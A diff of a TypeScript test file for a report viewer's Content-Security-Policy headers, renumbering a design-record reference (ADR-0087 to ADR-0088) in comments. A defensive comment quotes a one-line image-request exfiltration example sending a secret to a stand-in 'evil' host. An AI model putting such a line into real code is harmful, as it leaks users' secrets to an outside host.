@@ -25,7 +25,7 @@
 import { describe, expect, it } from "vitest";
 import { editViewHeaders, VIEW_CSP_ALLOWLIST, viewHeaders } from "./view-headers";
 
-// ADR-0087 (amends ADR-013): the enforcing view CSP is built from the ONE
+// ADR-0088 (amends ADR-013): the enforcing view CSP is built from the ONE
 // exported `Viewer CSP allowlist` constant, and these tests assert against
 // that constant rather than restating its hosts — a duplicated string here
 // would let the constant and its "specification" drift apart in the same
@@ -75,10 +75,10 @@ describe("viewHeaders", () => {
     expect(viewHeaders().get("Content-Security-Policy-Report-Only")).toBe(REPORT_ONLY_CSP);
   });
 
-  // ADR-0087: the artifact-parity allowlist. A report published here should
+  // ADR-0088: the artifact-parity allowlist. A report published here should
   // render the way the artifact it was generated as renders — the designed
   // typeface, the charting library — and these four hosts are what that costs.
-  describe("Viewer CSP allowlist (ADR-0087) — artifact parity, bought at four named hosts", () => {
+  describe("Viewer CSP allowlist (ADR-0088) — artifact parity, bought at four named hosts", () => {
     const enforcing = () =>
       (viewHeaders().get("Content-Security-Policy") ?? "").split(", ")[0] ?? "";
 
@@ -123,7 +123,7 @@ describe("viewHeaders", () => {
     });
 
     it("SECURITY: leaves every OUTBOUND directive pinned — the allowlist loads, it never sends", () => {
-      // This is the whole safety argument of ADR-0087. `connect-src 'self'`
+      // This is the whole safety argument of ADR-0088. `connect-src 'self'`
       // is what keeps exfiltration blocked (spec threat #3); `img-src` stays
       // pinned because a wildcard image source IS an exfil channel
       // (`new Image().src = "https://evil/?" + secret`) that defeats
@@ -472,9 +472,9 @@ describe("editViewHeaders vs viewHeaders — the two profiles differ only in the
   });
 
   it("the enforcing directive sets differ ONLY in the intended directives", () => {
-    // Intended differences: script-src / style-src / font-src (ADR-0087's
+    // Intended differences: script-src / style-src / font-src (ADR-0088's
     // allowlist is public-profile-only), connect-src (the edit profile's app
-    // origin), frame-ancestors (ADR-0087 relaxes the PUBLIC profile to 'self';
+    // origin), frame-ancestors (ADR-0088 relaxes the PUBLIC profile to 'self';
     // the edit route stays 'none'), and frame-src (new in the edit profile).
     // The public CSP header carries two appended values (enforcing + sandbox);
     // only the first (enforcing) is the comparable profile.
@@ -507,7 +507,7 @@ describe("editViewHeaders vs viewHeaders — the two profiles differ only in the
     }
 
     // script-src: the edit profile is STRICTER — it drops BOTH 'unsafe-inline'
-    // and the ADR-0087 allowlist. Never looser than the public profile.
+    // and the ADR-0088 allowlist. Never looser than the public profile.
     expect(publicDirectives["script-src"]).toBe(
       `'self' 'unsafe-inline' ${allow(VIEW_CSP_ALLOWLIST.scriptSrc)}`,
     );
